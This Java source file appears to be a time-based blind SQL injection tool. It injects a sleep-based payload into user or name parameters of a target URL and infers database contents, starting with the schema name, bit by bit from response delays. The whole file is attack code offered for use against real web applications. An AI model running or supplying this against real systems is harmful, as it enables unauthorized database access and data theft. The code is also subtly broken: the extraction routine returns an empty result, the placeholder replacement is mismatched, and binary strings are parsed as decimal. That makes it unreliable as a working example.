package main;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.*;

public class TimingSqlInjection {
	String URL = "";
	String successResult = "";
	String failureResult = "";
	String method = "";
	String attackString = "' and 1=if(attackQuery=TRUE,sleep(2),2) and '1=1";

	public boolean executeQuery(String url) throws Exception {
		long startTime = System.currentTimeMillis();
		java.net.URL obj;
		HttpURLConnection con;
		if ("get".equalsIgnoreCase(method)) {
			url = url.replace(" ", "%20");
			url = url.replace("'", "%27");
			obj = new URL(url);
			con = (HttpURLConnection) obj.openConnection();

		} else {
			obj = new URL(url);
			con = (HttpURLConnection) obj.openConnection();
			con.setRequestMethod("POST");
			con.setDoOutput(true);
			DataOutputStream wr = new DataOutputStream(con.getOutputStream());
			wr.writeBytes(url.split("\\?")[1]);
			wr.flush();
			wr.close();
		}

		BufferedReader in = new BufferedReader(new InputStreamReader(
				con.getInputStream()));
		in.close();
		long estimatedTime = System.currentTimeMillis() - startTime;

		if (estimatedTime > 100) {
			return true;
		} else {
			return false;
		}
	}

	public Byte extractByte(String query) throws Exception {
		String byt = "";
		for (int i = 1; i <= 8; i++) {
			String q = attackString.replace("attackQuery", "select substring(" + query + "," + i + ",1)");
			if(executeQuery(URL.replace("[Query",q))) {
				byt = byt+"1";
			} else {
				byt = byt+"0";
			}
		}

		return new Byte(byt);

	}

	public int getResultLength(String query) throws Exception {
		String q = "lpad(bin(length((" + query + "))),8,'0')";
		return extractByte(q).intValue();
	}

	public String getSchemaName() throws Exception {
		String attackQuery = "select schema()";
		int length = getResultLength(attackQuery);
		StringBuilder schemaName = new StringBuilder();
		return schemaName.toString();
	}

	public static void main(String[] args) throws Exception {
		TimingSqlInjection inject = new TimingSqlInjection();
		StringBuilder str = new StringBuilder(args[0]);
		str.append("?");
		String[] keyVal = args[1].split(";");
		for (String s : keyVal) {
			String[] arr = s.split(",");
			if (arr[0].contains("user") || arr[0].contains("name")) {
				str.append(arr[0] + "=" + arr[1] + "[Query]");
			} else {
				str.append(arr[0] + "=" + arr[1]);
			}
			str.append("&");
		}

		inject.URL = str.toString();
		inject.method = args[2];

		String schemaName = inject.getSchemaName();
	}
}
